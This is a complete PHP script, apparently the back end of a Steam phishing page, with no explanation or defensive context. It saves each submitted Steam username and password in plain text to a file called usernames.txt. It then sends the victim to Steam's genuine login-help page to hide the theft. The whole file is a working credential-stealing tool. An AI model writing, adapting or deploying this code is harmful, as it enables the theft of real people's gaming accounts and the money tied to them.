<?php

file_put_contents("usernames.txt", "Steam Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
exit();
?>